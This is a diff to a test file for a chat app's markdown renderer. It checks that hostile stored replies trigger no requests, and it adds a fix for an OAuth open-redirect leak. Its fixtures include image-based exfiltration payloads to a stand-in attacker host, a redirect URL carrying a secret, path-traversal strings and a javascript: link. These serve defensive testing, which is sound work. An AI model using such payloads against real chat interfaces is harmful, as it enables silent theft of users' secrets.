@@ -122,8 +122,40 @@ test.describe('chat/markdown — nothing is fetched without a click', () => {
 		}
 	})
 
-	test('an image from our own origin still renders inline', () => {
+	test('an uploaded image still renders inline', () => {
 		expect(renderMarkdown('![shot](/api/upload/abc.png)')).toContain('<img src="/api/upload/abc.png" alt="shot"')
+		// Query and fragment are dropped: the upload route reads neither.
+		expect(renderMarkdown('![shot](/api/upload/abc.png?v=2#top)')).toContain('<img src="/api/upload/abc.png" alt="shot"')
+	})
+
+	/**
+	 * Our own origin is not automatically safe to fetch. The GitHub connect route stored an
+	 * unchecked `?return=` in a cookie and the callback redirected to it, so one reply with
+	 * these two images forwarded a secret to another site with no click. The route is fixed
+	 * too (see source-control.oauth.spec.ts), but any other redirecting or state-changing GET
+	 * would reopen it, so only the upload route loads inline.
+	 */
+	test('a same-origin image that is not an upload is a link, not a request', () => {
+		for (const src of [
+			'/source-control/github/connect?return=https://attacker.example/SECRET',
+			'/source-control/github/callback',
+			'/api/upload/../../source-control/github/callback',
+			'/api/upload/%2e%2e/%2e%2e/source-control/github/callback',
+			'/api/preview/raw?conversationId=c1&path=x.png',
+			'/settings',
+			'api/upload/abc.png',
+		]) {
+			const html = renderMarkdown(`![x](${src})`)
+			expect(html, src).not.toMatch(/<img/i)
+			expect(html, src).toContain('class="md-remote-image"')
+		}
+	})
+
+	test('titles and alt text show entities once, not as literal escapes', () => {
+		expect(renderMarkdown('[a](https://example.com "&quot;hi&quot; &amp; bye")')).toContain(
+			'title="&quot;hi&quot; &amp; bye"',
+		)
+		expect(renderMarkdown('![a &amp; b](/api/upload/abc.png)')).toContain('alt="a &amp; b"')
 	})
 })
 
@@ -170,6 +202,11 @@ test.describe('chat/markdown — a stored hostile reply on the chat page', () =>
 			remoteRequests.push(route.request().url())
 			return route.abort()
 		})
+		// The same-origin half of the leak: images that would bounce through the OAuth routes.
+		const bounceRequests: string[] = []
+		page.on('request', (request) => {
+			if (new URL(request.url()).pathname.startsWith('/source-control/github/')) bounceRequests.push(request.url())
+		})
 
 		try {
 			const conversation = await seedConversation(prefix, {
@@ -183,6 +220,8 @@ test.describe('chat/markdown — a stored hostile reply on the chat page', () =>
 					'',
 					'![leak](https://attacker.example/?d=SECRET)',
 					'',
+					'![a](/source-control/github/connect?return=https://attacker.example/SECRET2) ![b](/source-control/github/callback)',
+					'',
 					`[click me](javascript:${PWN})`,
 				].join('\n'),
 			})
@@ -195,9 +234,11 @@ test.describe('chat/markdown — a stored hostile reply on the chat page', () =>
 
 			expect(await body.locator('img').count()).toBe(0)
 			expect(await body.locator('a[href^="javascript" i]').count()).toBe(0)
-			await expect(body.locator('a.md-remote-image')).toHaveAttribute('href', 'https://attacker.example/?d=SECRET')
+			await expect(body.locator('a.md-remote-image[href="https://attacker.example/?d=SECRET"]')).toHaveCount(1)
+			await expect(body.locator('a.md-remote-image[href="/source-control/github/callback"]')).toHaveCount(1)
 			expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined()
 			expect(remoteRequests).toEqual([])
+			expect(bounceRequests).toEqual([])
 		} finally {
 			await cleanupPrefixedRecords(prefix)
 		}
